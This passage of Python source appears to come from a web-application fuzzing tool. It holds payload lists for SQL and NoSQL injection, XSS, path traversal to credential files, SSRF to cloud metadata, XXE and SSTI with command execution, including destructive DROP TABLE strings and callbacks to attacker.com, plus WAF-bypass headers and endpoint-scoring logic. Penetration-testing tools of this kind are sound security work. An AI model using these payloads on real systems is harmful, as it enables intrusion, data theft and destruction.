        "price_manipulation": ["-1", "0", "0.01", "999999999", "1e10"],
        "quantity_abuse": ["-1", "0", "999999", "2147483647"],
        "workflow_bypass": [
            "Skip payment step",
            "Direct checkout",
            "Replay old state",
        ],
        "time_manipulation": ["Future dates", "Past dates", "Timezone abuse"],
        "currency_confusion": ["USD to cents", "EUR to USD", "Negative amounts"],
    }

def _get_sqli_payloads(self):
    return [
        "'","''","\"","\"\"","`","``",
        "' OR '1'='1","' OR 1=1--","' OR 'a'='a","\" OR \"1\"=\"1",
        "' OR '1'='1'--","' OR '1'='1'/*","' OR '1'='1'#",
        "1' OR '1'='1","1' OR 1=1--","admin' OR '1'='1","admin'--",
        "' UNION SELECT NULL--","' UNION SELECT NULL,NULL--",
        "' UNION ALL SELECT NULL--","' UNION SELECT @@version--",
        "'; WAITFOR DELAY '0:0:5'--","'; SELECT SLEEP(5)--",
        "' AND SLEEP(5)--","1' AND SLEEP(5)#","')","))",")))",
        "' AND 1=CONVERT(int,(SELECT @@version))--",
        "'; DROP TABLE users--","' ORDER BY 1--","' ORDER BY 10--",
        "admin'#","admin'/*","admin' OR 1=1#",
        "' AND '1'='1","' AND '1'='2","1' AND '1'='1","1' AND '1'='2",
        "' OR 1=1 LIMIT 1--","' OR 1=1 LIMIT 1#","' OR 1=1 LIMIT 1/*",
        "' UNION SELECT NULL,NULL,NULL--","' UNION SELECT 1,2,3--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,@@version),1)--",
        "' AND 1=CAST(@@version AS INT)--",
        "'; EXEC sp_MSforeachtable 'DROP TABLE ?'--",
        "' OR EXISTS(SELECT * FROM users)--",
        "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",
        "1' AND '1'='1' AND '1'='1","1' AND '1'='2' OR '1'='1",
        "\\' OR 1=1--","\\\\' OR 1=1--","' OR 'x'='x","') OR ('x'='x",
        "')) OR (('x'='x","'))) OR ((('x'='x",
        "' OR username IS NOT NULL--","' OR 1=1%00","' OR 1=1;%00",
        "admin' AND 1=0 UNION ALL SELECT NULL,NULL,NULL--",
        "' RLIKE (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "'||(SELECT SLEEP(5))||'","'+(SELECT SLEEP(5))+'",'"+(SELECT 0 WHERE 0 LIKE 0)+"',
    ]

def _get_xss_payloads(self):
    return [
        "<script>alert(1)</script>","<script>alert(document.domain)</script>",
        "<img src=x onerror=alert(1)>","<svg onload=alert(1)>",
        "<body onload=alert(1)>","<input onfocus=alert(1) autofocus>",
        "'><script>alert(1)</script>","\"><script>alert(1)</script>",
        "</script><script>alert(1)</script>","</title><script>alert(1)</script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "{{7*7}}","${7*7}","<%= 7*7 %>","#{7*7}",
        "{{constructor.constructor('alert(1)')()}}",
        "javascript:alert(1)","javascript:alert(document.cookie)",
        "data:text/html,<script>alert(1)</script>",
        "<svg><script>alert(1)</script></svg>",
        "<iframe src=javascript:alert(1)>",
        "<img src=x onerror=\"alert(1)\">","<svg/onload=alert(1)>",
        "<img src=x onerror=alert`1`>","<svg onload=alert`1`>",
        "<img src=x onerror=\\u0061lert(1)>",
        "<img src=x onerror=\\x61lert(1)>",
        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
        "<details open ontoggle=alert(1)>","<marquee onstart=alert(1)>",
        "<video src=x onerror=alert(1)>","<audio src=x onerror=alert(1)>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<keygen onfocus=alert(1) autofocus>",
        "<body onpageshow=alert(1)>","<body onhashchange=alert(1)>",
        "<svg><animate onbegin=alert(1)>","<svg><set onbegin=alert(1)>",
        "<object data=javascript:alert(1)>",
        "<embed src=javascript:alert(1)>",
        "<form action=javascript:alert(1)><input type=submit>",
        "<isindex action=javascript:alert(1) type=submit>",
        "<math><mi xlink:href=javascript:alert(1)>click",
        "<svg><a xlink:href=javascript:alert(1)><text x=0 y=20>XSS</text></a></svg>",
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        "<img src=x:alert(1) onerror=eval(src)>",
        "<img src=x onerror=this.src='javascript:alert(1)'>",
        "<img src=x onerror=Function`a${'alert(1)'}a`()>",
        "<iframe srcdoc=\"<script>alert(1)</script>\">",
        "<iframe src=\"data:text/html,<script>alert(1)</script>\">",
        "<base href=javascript:alert(1)//>",
        "<link rel=import href=data:text/html,<script>alert(1)</script>>",
        "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
        "<style>@import'javascript:alert(1)';</style>",
        "<style>*{background:url('javascript:alert(1)')}</style>",
        "<xss id=x tabindex=1 onfocus=alert(1)></xss>",
        "<xss onclick=alert(1)>click","<xss onmouseover=alert(1)>hover",
        "'-alert(1)-'",'"-alert(1)-"',"javascript:alert(1)//",
        "<script>alert(1)//","<script>alert(1)<!--","<script>alert(1)</script",
        "<ScRiPt>alert(1)</sCrIpT>","<script>al\u0065rt(1)</script>",
        "<script>al\x65rt(1)</script>","<script>\u0061lert(1)</script>",
    ]

def _get_nosqli_payloads(self):
    return [
        "{'$gt':''}","{'$ne':null}","{'$regex':'.*'}","{'$exists':true}",
        "{'$nin':[]}","{'$or':[{},{'a':'a'}]}","[$ne]=1","[$gt]=",
        "[$regex]=.*","[$exists]=true","[$or][0][admin]=1","[$where]=1",
        '{"$where":"1==1"}','{"$where":"return true"}',
        '{"$where":"this.password.match(/.*/)"}',
        "{'username':{'$regex':'^admin'}}","{'password':{'$regex':'.*'}}",
        "{'username':{'$type':2}}","{'password':{'$type':1}}",
        "{'$gt':0}","{'$gte':0}","{'$lt':999999}","{'$lte':999999}",
        "{'$in':['admin','root']}","{'$nin':['']}",
        "{'$not':{'$eq':''}}","{'$nor':[{'a':1}]}",
        "[$ne]=","[$gt]=0","[$gte]=0","[$lt]=999999","[$nin][]=",
        "[$in][]=admin","[$in][]=root","[$regex]=^.*$","[$options]=i",
        '{"$where":"sleep(5000)"}','{"$where":"return sleep(5000)"}',
        "{'$expr':{'$eq':['$password','$password']}}",
        "{'$jsonSchema':{}}","{'$text':{'$search':'admin'}}",
        "{'$mod':[2,0]}","{'$all':[]}","{'$elemMatch':{}}",
        "{'$size':0}","{'$bitsAllSet':0}","{'$comment':'injection'}",
        "username[$ne]=invalid&password[$ne]=invalid",
        "username[$regex]=.*&password[$regex]=.*",
        "username[$gt]=&password[$gt]=",
        "login[$regex]=a.*&pass[$ne]=1",
        "{'username':{'$ne':''},'password':{'$ne':''}}",
        "{'$or':[{'username':'admin'},{'username':'root'}]}",
        "{'$and':[{'$or':[{'username':'admin'}]},{'$or':[{'password':{'$ne':''}}]}]}",
    ]

def _get_path_traversal_payloads(self):
    return [
        # Basic
        "../",
        "..%2f",
        "..\\",
        "..%5c",
        "..;",
        # Multiple levels
        "../../",
        "../../../",
        "../../../../",
        "../../etc/passwd",
        "../../../etc/passwd",
        # Encoded
        "..%2f..%2f",
        "..%252f..%252f",
        "..%c0%af..%c0%af",
        # Double encoding
        "..%252f..%252fetc%252fpasswd",
        # Bypass filters
        "....//....//",
        "..../..../",
        "....\\....\\",
        # Absolute paths
        "/etc/passwd",
        "/etc/shadow",
        "/windows/win.ini",
        "C:\\windows\\win.ini",
        "C:/windows/win.ini",
        # Null byte
        "../../../etc/passwd%00",
        "../../../etc/passwd%00.jpg",
        # Wrappers
        "file:///etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
    ]

def _get_ssrf_payloads(self):
    return [
        # Internal IPs
        "http://127.0.0.1",
        "http://localhost",
        "http://0.0.0.0",
        "http://[::1]",
        "http://[::ffff:127.0.0.1]",
        # Private networks
        "http://192.168.1.1",
        "http://10.0.0.1",
        "http://172.16.0.1",
        # Cloud metadata
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        # Bypass filters
        "http://127.1",
        "http://0x7f.0x0.0x0.0x1",
        "http://2130706433",
        "http://127.0.0.1.nip.io",
        "http://127.0.0.1.xip.io",
        # DNS rebinding
        "http://spoofed.burpcollaborator.net",
        # File protocol
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
    ]

def _get_xxe_payloads(self):
    return [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]><foo>&xxe;</foo>',
        '<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>',
    ]

def _get_ssti_payloads(self):
    return [
        "{{7*7}}",
        "${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{config}}",
        "{{self}}",
        "${applicationScope}",
        "{{''.__class__.__mro__[1].__subclasses__()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "${T(java.lang.Runtime).getRuntime().exec('calc')}",
        "*{7*7}",
        "@{7*7}",
        "~{7*7}",
    ]

def _get_deserialization_payloads(self):
    return [
        'O:8:"stdClass":0:{}',
        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",
        '{"@type":"java.net.Inet4Address","val":"attacker.com"}',
        "aced0005737200",
        "YToxOntzOjM6XCJmb29cIjtzOjM6XCJiYXJcIjt9",
    ]

def _get_waf_bypass_headers(self):
    """Header-based WAF bypass (IP spoofing, host manipulation, smuggling)"""
    return [
        # IP spoofing (basic)
        "X-Forwarded-For: 127.0.0.1",
        "X-Originating-IP: 127.0.0.1",
        "X-Remote-IP: 127.0.0.1",
        "X-Remote-Addr: 127.0.0.1",
        "X-Client-IP: 127.0.0.1",
        "Client-IP: 127.0.0.1",
        "X-Real-IP: 127.0.0.1",
        "True-Client-IP: 127.0.0.1",
        # Advanced IP spoofing
        "X-Forwarded-For: 127.0.0.1, 127.0.0.1",  # Multiple IPs
        "X-Forwarded-For: localhost",  # Hostname instead of IP
        "X-Forwarded-For: [::1]",  # IPv6 localhost
        "X-Forwarded-For: 0.0.0.0",  # Wildcard IP
        # Host manipulation
        "X-Host: 127.0.0.1",
        "X-Forwarded-Host: 127.0.0.1",
        "X-Forwarded-Host: localhost",
        # URL rewriting
        "X-Original-URL: /admin",
        "X-Rewrite-URL: /admin",
        "X-Custom-IP-Authorization: 127.0.0.1",
        # Protocol manipulation
        "X-Forwarded-Proto: https",
        "X-Forwarded-Scheme: https",
        "Front-End-Https: on",
        # Cache poisoning
        "X-Forwarded-Host: evil.com",
        "X-Host: evil.com",
        # Request smuggling helpers
        "Transfer-Encoding: chunked",
        "Content-Length: 0",
    ]

def _get_waf_bypass_encoding(self):
    """Encoding bypass (URL/Unicode/Hex/HTML entities, case variation)"""
    return {
        # Single URL encoding
        "url_encode": ["%27", "%3C", "%3E", "%22", "%2F", "%20", "%3B", "%28", "%29"],
        # Double URL encoding (bypasses single decode)
        "double_encode": ["%2527", "%253C", "%253E", "%2522", "%252F"],
        # Triple encoding (for aggressive WAFs)
        "triple_encode": ["%25252527", "%2525253C"],
        # Unicode encoding
        "unicode": ["\\u0027", "\\u003c", "\\u003e", "\\u0022", "\\u002f"],
        # Unicode overlong encoding
        "unicode_overlong": ["\\u00027", "\\u0003c"],
        # Hex encoding
        "hex": ["\\x27", "\\x3c", "\\x3e", "\\x22", "\\x2f"],
        # Octal encoding
        "octal": ["\\047", "\\074", "\\076"],
        # HTML entity encoding
        "html_entity": ["&#39;", "&#60;", "&#62;", "&lt;", "&gt;", "&quot;"],
        # Mixed case (bypasses case-sensitive rules)
        "mixed_case": ["<ScRiPt>", "SeLeCt", "UnIoN", "oR", "AnD", "WhErE"],
        # UTF-7 encoding
        "utf7": ["+ADw-script+AD4-", "+ADw-img src+AD0-x+AD4-"],
        # Null byte injection
        "null_byte": ["%00", "\\x00", "\\0"],
        # Newline/tab injection
        "whitespace": ["%0a", "%0d", "%09", "\\n", "\\r", "\\t"],
    }

def _get_waf_bypass_http_methods(self):
    """HTTP method manipulation (override headers, verb tampering)"""
    return {
        # Method override headers
        "method_override_headers": [
            "X-HTTP-Method-Override: PUT",
            "X-HTTP-Method-Override: DELETE",
            "X-HTTP-Method-Override: PATCH",
            "X-Method-Override: PUT",
            "X-Method-Override: DELETE",
            "_method=PUT",  # Query parameter
            "_method=DELETE",
        ],
        # Case variations (bypass case-sensitive filters)
        "case_variations": ["GeT", "PoSt", "pUt", "DeLeTe", "PaTcH", "OpTiOnS"],
        # Verb tampering (uncommon methods)
        "verb_tampering": ["TRACE", "TRACK", "DEBUG", "CONNECT", "PROPFIND", "PROPPATCH"],
        # Arbitrary methods
        "arbitrary_methods": ["HACK", "ADMIN", "TEST", "CUSTOM"],
        # Whitespace injection
        "whitespace_methods": ["GET ", " GET", "GET\\t", "GET\\n"],
    }

def _get_waf_bypass_path_tricks(self):
    """Path manipulation (dot encoding, null bytes, Unicode tricks)"""
    return [
        # Basic path pollution
        "//",
        "/.//",
        "/./",
        # Encoded dots
        "/%2e/",
        "/%2e%2e/",
        "/%252e/",  # Double encoded
        # Semicolon tricks
        "/;/",
        "/;foo=bar/",
        "/..;/",
        "/.;/",
        # Null byte injection
        "/%00/",
        "/%00.html",
        # Newline/tab injection
        "/%0a/",
        "/%0d/",
        "/%09/",
        # Backslash (Windows)
        "/\\/",
        "/..\\../",
        # Unicode normalization
        "/\\u002e\\u002e/",
        # Question mark trick
        "/?/",
        "/#/",
        # Multiple slashes
        "///",
        "////",
        # Dot variations
        "/...//",
        "/..../",
    ]

def _get_waf_bypass_content_type(self):
    """Content-Type manipulation (charset variations, boundary tricks)"""
    return [
        # Standard types
        "application/x-www-form-urlencoded",
        "multipart/form-data",
        "text/plain",
        "application/json",
        "application/json; charset=utf-8",
        "application/xml",
        "text/xml",
        # Charset variations
        "application/json; charset=iso-8859-1",
        "application/json; charset=utf-16",
        "application/json; charset=utf-32",
        # Case variations
        "Application/Json",
        "APPLICATION/JSON",
        "application/JSON",
        # With boundary (multipart)
        "multipart/form-data; boundary=----WebKitFormBoundary",
        # Uncommon types
        "application/octet-stream",
        "application/x-amf",
        "text/html",
        # Empty/null
        "",
        "null",
    ]

def _get_entry(self, entries):
    """Get single entry from list or dict - handles both capture and import"""
    if isinstance(entries, list):
        return entries[0] if entries else {}
    return entries

def _normalize_endpoint_data(self, entry):
    """Normalize endpoint data to consistent format"""
    params = entry.get("parameters", {})
    param_patterns = entry.get("param_patterns", {})

    return {
        "path": entry["normalized_path"],
        "method": entry["method"],
        "host": self._ascii_safe(entry.get("host"), lower=True).strip(),
        "protocol": self._ascii_safe(entry.get("protocol"), lower=True).strip()
        or "https",
        "auth": entry.get("auth_detected", []),
        "params": {
            "url": self._normalize_param_list(params.get("url", [])),
            "body": self._normalize_param_list(params.get("body", [])),
            "json": self._normalize_param_list(params.get("json", [])),
            "cookie": self._normalize_param_list(params.get("cookie", [])),
        },
        "reflected": (
            param_patterns.get("reflected", [])
            if isinstance(param_patterns, dict)
            else []
        ),
        "content_type": entry.get("content_type", ""),
        "response_status": entry.get("response_status", 200),
        "response_body": entry.get("response_body", ""),
    }

def _normalize_param_list(self, param_data):
    """Convert params to list format (handles dict or list)"""
    if isinstance(param_data, dict):
        return list(param_data.keys())
    elif isinstance(param_data, list):
        return param_data
    return []

def _attack_selected(self, attack_type, aliases):
    """Match selected attack mode while keeping `All` as a superset."""
    selected = (attack_type or "").strip().lower()
    if selected == "all":
        return True
    for alias in aliases:
        if selected == str(alias).strip().lower():
            return True
    return False

def _fuzzer_has_api_signal(self, normalized, include_write_method=False):
    """Check whether endpoint looks like an API target (not generic frontend traffic)."""
    method = self._ascii_safe(normalized.get("method"), lower=True).strip().upper()
    path = self._ascii_safe(normalized.get("path") or "/", lower=True).strip()
    content_type = self._ascii_safe(normalized.get("content_type"), lower=True).strip()
    has_api_marker = bool(
        "/api/" in path
        or "/graphql" in path
        or "/rest/" in path
        or "/openapi" in path
        or "/swagger" in path
        or "/metadata/" in path
        or "/oauth" in path
        or "/auth/" in path
        or re.match(r"^/v\d+(?:\.\d+)?(?:/|$)", path)
    )
    has_structured_content = bool(
        (
            "json" in content_type
            or "xml" in content_type
            or "protobuf" in content_type
            or "x-www-form-urlencoded" in content_type
            or "multipart/form-data" in content_type
        )
        and "javascript" not in content_type
        and "html" not in content_type
    )
    if include_write_method and method in ["POST", "PUT", "PATCH", "DELETE"]:
        return True
    return has_api_marker or has_structured_content

def _fuzzer_has_object_target(self, normalized):
    """Check for object/resource targeting hints for auth/BOLA style tests."""
    path = self._ascii_safe(normalized.get("path") or "/", lower=True)
    if any(x in path for x in ["{id}", "{uuid}", "{objectid}"]):
        return True
    if self.NUMERIC_ID_PATTERN.search(path):
        return True
    if self.UUID_PATTERN.search(path):
        return True
    if self.OBJECTID_PATTERN.search(path):
        return True
    params = normalized.get("params", {})
    param_names = (
        list(params.get("url", []))
        + list(params.get("body", []))
        + list(params.get("json", []))
    )
    for name in [self._ascii_safe(x, lower=True) for x in param_names]:
        if any(token in name for token in ["id", "uuid", "object", "user", "account"]):
            return True
    return False

def _check_idor(self, normalized, attack_type):
    """Check if endpoint is vulnerable to IDOR - verify ID params are used"""
    if not self._attack_selected(attack_type, ["BOLA", "IDOR"]):
        return None
    path = normalized["path"]
    if "{id}" not in path and "{uuid}" not in path and "{objectid}" not in path:
        return None
    
    # Verify ID parameters are actually present in URL params
    params = normalized["params"]
    has_id_param = any(
        "id" in str(p).lower() for p in params.get("url", [])
    )
    
    # Skip if path has {id} but no actual ID parameter (likely frontend route)
    if not has_id_param and "{id}" in path:
        # Check if it's a REST API pattern (not frontend route)
        if not any(indicator in path.lower() for indicator in ["/api/", "/v1/", "/v2/", "/v3/"]):
            return None

    param_type = "uuid" if "{uuid}" in path else "numeric"
    techniques = self._get_bola_techniques()

    return {
        "type": "IDOR/BOLA",
        "payloads": self._get_idor_payloads(param_type)[:8],
        "techniques": {
            "horizontal": techniques["horizontal"],
            "vertical": techniques["vertical"],
            "wildcard": techniques["wildcard"][:3],
            "encoding": techniques["encoding"],
            "param_pollution": techniques["parameter_pollution"][:2],
        },
        "test": "Horizontal/vertical privilege escalation, wildcard injection, encoding bypass",
        "risk": "Access/modify other users' resources, privilege escalation",
        "note": "Verify endpoint exists (not 404) and requires authentication before testing"
    }

def _check_bola(self, normalized, attack_type):
    """Check for BOLA-specific attacks on authenticated API-like object targets."""
    if not self._attack_selected(attack_type, ["BOLA"]):
        return None
    if "None" in normalized["auth"]:
        return None
    if not self._fuzzer_has_api_signal(normalized):
        return None
    if not self._fuzzer_has_object_target(normalized):
        return None

    techniques = self._get_bola_techniques()
    method = normalized["method"]

    attacks = []
    if method in ["GET", "POST", "PUT", "PATCH", "DELETE"]:
        attacks.append("Remove Authorization header")
        attacks.append("Use expired/invalid token")
    if "Bearer Token" in normalized["auth"]:
        attacks.extend(
            ["JWT alg:none", "JWT null signature", "JWT kid manipulation"]
        )
    if method in ["PUT", "PATCH", "DELETE"]:
        attacks.extend(techniques["method_override"])

    return {
        "type": "BOLA",
        "attacks": attacks,
        "techniques": {
            "horizontal": techniques["horizontal"],
            "vertical": techniques["vertical"],
            "batch": techniques["batch_requests"],
            "type_confusion": techniques["type_confusion"],
        },
        "test": "Test all authenticated endpoints for broken object level authorization",
        "risk": "Unauthorized access to resources belonging to other users",
        "auth_required": True,
        "note": "[!] REQUIRES AUTHENTICATION: Capture authenticated traffic first or provide valid tokens"
    }

def _check_auth_bypass(self, normalized, attack_type):
    """Check auth bypass potential for authenticated API-like object targets."""
    if not self._attack_selected(attack_type, ["Auth Bypass"]):
        return None
    if "None" in normalized["auth"]:
        return None
    if not self._fuzzer_has_api_signal(normalized):
        return None
    if not self._fuzzer_has_object_target(normalized):
        return None
    details = ["Remove auth, invalid tokens, expired tokens"]
    if "Bearer Token" in normalized["auth"]:
        details.append("JWT: alg:none, weak secret, expired token")
    if "Session Cookie" in normalized["auth"]:
        details.append("Cookie: Tamper session ID, fixation, hijacking")
    return {
        "type": "Auth Bypass",
        "details": details,
        "risk": "Unauthorized access",
        "auth_required": True,
        "note": "[!] REQUIRES AUTHENTICATION: Test with valid credentials first"
    }

def _check_sqli(self, normalized, attack_type):
    """Check SQLi potential with API + parameter + route semantics."""
    if not self._attack_selected(attack_type, ["SQLi", "SQL Injection"]):
        return None
    if not self._fuzzer_has_api_signal(normalized):
        return None
    params = normalized["params"]
    candidate_params = list(params.get("url", [])) + list(params.get("body", [])) + list(
        params.get("json", [])
    )
    if not candidate_params:
        return None

    candidate_params_lower = [self._ascii_safe(x, lower=True) for x in candidate_params]
    sqli_params = []
    for idx, name in enumerate(candidate_params_lower):
        if any(keyword in name for keyword in self.FUZZER_SQLI_PARAM_KEYWORDS):
            sqli_params.append(candidate_params[idx])
    if not sqli_params:
        return None

    # Require route semantics that suggest server-side querying
    path = normalized["path"].lower()
    likely_db_query = any(
        indicator in path for indicator in [
            "search", "query", "filter", "find", "list", "lookup", "report", "user", "account"
        ]
    )
    if not likely_db_query:
        return None

    return {
        "type": "SQL Injection",
        "params": sqli_params[:5],
        "payloads": self._get_sqli_payloads()[:5],
        "risk": "Database compromise",
        "confidence": "High",
        "note": "Test for actual SQL errors in response before confirming vulnerability"
    }

def _check_xss(self, normalized, attack_type):
    """Check if endpoint has XSS potential - only for HTML responses"""
    if not self._attack_selected(attack_type, ["XSS"]):
        return None
    if not normalized["reflected"]:
        return None
    # Only flag XSS for HTML responses (not JSON APIs)
    content_type = normalized["content_type"].lower()
    if "json" in content_type or "xml" in content_type:
        return None
    if "html" not in content_type and "text/plain" not in content_type:
        return None
    return {
        "type": "XSS",
        "reflected": normalized["reflected"],
        "payloads": self._get_xss_payloads()[:4],
        "risk": "Client-side code execution",
        "note": "HTML context detected - reflection in JSON APIs is not XSS"
    }

def _check_ssrf(self, normalized, attack_type):
    """Check for SSRF candidates using path/parameter hints."""
    if not self._attack_selected(attack_type, ["SSRF"]):
        return None
    if not self._fuzzer_has_api_signal(normalized):
        return None
    params = normalized["params"]
    candidate_params = list(params.get("url", [])) + list(params.get("body", [])) + list(
        params.get("json", [])
    )
    candidate_params_lower = [self._ascii_safe(x, lower=True) for x in candidate_params]
    path = normalized["path"].lower()
    ssrf_params = []
    for idx, name in enumerate(candidate_params_lower):
        if any(keyword in name for keyword in self.FUZZER_SSRF_PARAM_KEYWORDS):
            ssrf_params.append(candidate_params[idx])
    path_hits = any(
        marker in path
        for marker in ["/proxy", "/fetch", "/webhook", "/import", "/redirect", "/url"]
    )
    if not ssrf_params:
        return None
    method = self._ascii_safe(normalized.get("method"), lower=True).strip().upper()
    if (not path_hits) and method not in ["POST", "PUT", "PATCH"]:
        return None
    return {
        "type": "SSRF",
        "params": ssrf_params[:6],
        "payloads": self._get_ssrf_payloads()[:6],
        "test": "Probe internal hosts, metadata endpoints, and protocol confusion",
        "risk": "Internal network access, metadata theft, and pivoting",
        "note": "Prefer Burp Collaborator/internal canary targets for safe validation",
    }

def _check_xxe(self, normalized, attack_type):
    """Check for XML/XXE candidates from content type, path, and parameter hints."""
    if not self._attack_selected(attack_type, ["XXE"]):
        return None
    content_type = normalized["content_type"].lower()
    path = normalized["path"].lower()
    params = normalized["params"]
    body_like_params = list(params.get("body", [])) + list(params.get("json", []))
    body_like_lower = [str(x).lower() for x in body_like_params]
    xml_hints = (
        "xml" in content_type
        or "soap" in content_type
        or any(marker in path for marker in ["/xml", "/soap", "/saml"])
        or any(
            any(keyword in name for keyword in ["xml", "soap", "saml", "payload", "doctype", "svg"])
            for name in body_like_lower
        )
    )
    if not xml_hints:
        return None
    return {
        "type": "XXE",
        "params": body_like_params[:6],
        "payloads": self._get_xxe_payloads()[:4],
        "test": "External entity resolution, file disclosure, and blind XXE callbacks",
        "risk": "Sensitive file access, SSRF via parser, and parser DoS",
        "note": "Only test XXE against endpoints that accept XML payloads",
    }

def _check_nosqli(self, normalized, attack_type):
    """Check if endpoint has NoSQL injection potential"""
    if not self._attack_selected(attack_type, ["NoSQL", "NoSQL Injection"]):
        return None
    if "json" not in normalized["content_type"].lower():
        return None
    params = normalized["params"]
    if not params["json"] and not params["body"]:
        return None
    return {
        "type": "NoSQL Injection",
        "payloads": self._get_nosqli_payloads()[:3],
        "risk": "Database bypass",
    }

def _check_path_traversal(self, normalized, attack_type):
    """Check if endpoint has path traversal potential"""
    if not self._attack_selected(attack_type, ["Path Traversal"]):
        return None
    path = normalized["path"].lower()
    if not any(p in path for p in ["file", "path", "download", "upload"]):
        return None
    return {
        "type": "Path Traversal",
        "payloads": self._get_path_traversal_payloads()[:4],
        "risk": "File system access",
    }

def _check_mass_assignment(self, normalized, attack_type):
    """Check if endpoint has mass assignment potential"""
    if not self._attack_selected(attack_type, ["Mass Assignment"]):
        return None
    if normalized["method"] not in ["POST", "PUT", "PATCH"]:
        return None
    return {
        "type": "Mass Assignment",
        "inject": "role=admin, isAdmin=true, permissions=*",
        "risk": "Privilege escalation",
    }

def _generate_attack_lines(self, key, attack):
    """Generate output lines for an attack"""
    if not attack:
        return []
    lines = ["[{}] {}".format(attack["type"], key)]

    if "_score" in attack:
        try:
            lines.append("  Score: {}/100".format(int(attack.get("_score", 0) or 0)))
        except (TypeError, ValueError):
            pass
    
    # Show authentication requirement warning
    if attack.get("auth_required"):
        lines.append("  [!] AUTH REQUIRED: Test with valid credentials")
    
    # Show confidence level
    if "confidence" in attack:
        lines.append("  Confidence: {}".format(attack["confidence"]))

    # Payloads (limit to 5 for readability)
    if "payloads" in attack:
        payloads = attack["payloads"][:5]
        lines.append("  Payloads: {}".format(", ".join(str(p) for p in payloads)))

    # Attacks (limit to 3)
    if "attacks" in attack:
        attacks = attack["attacks"][:3]
        lines.append("  Attacks: {}".format(", ".join(attacks)))

    # Params (limit to 5)
    if "params" in attack and attack["params"]:
        params = attack["params"][:5]
        lines.append("  Params: {}".format(", ".join(str(p) for p in params)))

    # Reflected (limit to 3)
    if "reflected" in attack:
        reflected = attack["reflected"][:3]
        lines.append("  Reflected: {}".format(", ".join(str(p) for p in reflected)))

    # Test description
    if "test" in attack:
        lines.append("  Test: {}".format(attack["test"]))

    # Inject
    if "inject" in attack:
        lines.append("  Inject: {}".format(attack["inject"]))

    # Risk
    lines.append("  Risk: {}".format(attack["risk"]))
    
    # Important notes
    if "note" in attack:
        lines.append("  [*] Note: {}".format(attack["note"]))
    
    lines.append("")  # Blank line between attacks
    return lines

def _score_fuzz_attack(self, key, attack, normalized):
    """Compute exploitability score so campaigns are ranked by value, not insertion order."""
    attack_type = self._ascii_safe((attack or {}).get("type") or "")
    method = self._ascii_safe((normalized or {}).get("method") or "", lower=True).upper()
    path = self._ascii_safe((normalized or {}).get("path") or "", lower=True)
    auth = [self._ascii_safe(x, lower=True) for x in ((normalized or {}).get("auth", []) or [])]
    params = (normalized or {}).get("params", {}) or {}

    base_scores = {
        "IDOR/BOLA": 95,
        "BOLA": 93,
        "Auth Bypass": 90,
        "SQL Injection": 88,
        "SSRF": 86,
        "XXE": 84,
        "JWT Exploitation": 82,
        "GraphQL Abuse": 81,
        "Deserialization": 80,
        "SSTI": 78,
        "NoSQL Injection": 74,
        "Mass Assignment": 72,
        "Business Logic": 70,
        "XSS": 66,
        "Race Condition": 64,
        "WAF Bypass": 40,
    }
    score = int(base_scores.get(attack_type, 55))

    param_count = 0
    for field in ["url", "body", "json", "cookie"]:
        param_count += len(params.get(field, []) or [])
    score += min(8, int(param_count))

    reflected = list((attack or {}).get("reflected", []) or [])
    if reflected:
        score += min(5, len(reflected))

    if bool((attack or {}).get("auth_required")):
        score += 3
    if method in ["POST", "PUT", "PATCH", "DELETE"]:
        score += 4
    if self._fuzzer_has_api_signal(normalized, include_write_method=True):
        score += 3
    if self._fuzzer_has_object_target(normalized):
        score += 2
    if any(x != "none" for x in auth):
        score += 2
    if any(marker in path for marker in ["/admin", "/auth", "/token", "/account"]):
        score += 2

    confidence_text = self._ascii_safe((attack or {}).get("confidence") or "", lower=True)
    if confidence_text == "high":
        score += 3
    elif confidence_text == "medium":
        score += 1

    if attack_type == "WAF Bypass" and not self._fuzzer_has_api_signal(normalized):
        score -= 18
    if attack_type == "WAF Bypass" and method == "GET":
        score -= 8

    return max(1, min(100, int(score)))

def _fuzzer_endpoint_is_api_like(self, normalized, strict=True):
    """Gate fuzzer candidates to API-like traffic, not static/ad-tech routes."""
    method = self._ascii_safe(normalized.get("method"), lower=True).strip().upper()
    path = self._ascii_safe(normalized.get("path") or "/", lower=True).strip()
    content_type = self._ascii_safe(normalized.get("content_type"), lower=True).strip()
    auth = [
        self._ascii_safe(x, lower=True)
        for x in (normalized.get("auth", []) or [])
    ]

    first_part = ""
    parts = [p for p in path.strip("/").split("/") if p]
    if parts:
        first_part = parts[0]

    if strict and self._path_contains_noise_marker(
        path, self.FUZZER_STRICT_NOISE_PATH_MARKERS
    ):
        return False
    if path.endswith(self.PASSIVE_STATIC_EXTENSIONS):
        return False
    if path.endswith(".html") and "/api/" not in path:
        return False
    if first_part in self.FUZZER_STATIC_PATH_PARTS:
        return False
    if self._ffuf_is_noise_path_segment(first_part):
        return False
    if (
        "javascript" in content_type
        or "ecmascript" in content_type
        or "text/css" in content_type
        or content_type.startswith("image/")
        or content_type.startswith("font/")
        or content_type.startswith("video/")
        or content_type.startswith("audio/")
    ):
        return False

    has_api_signal = self._fuzzer_has_api_signal(normalized)

    params = normalized.get("params", {})
    param_count = 0
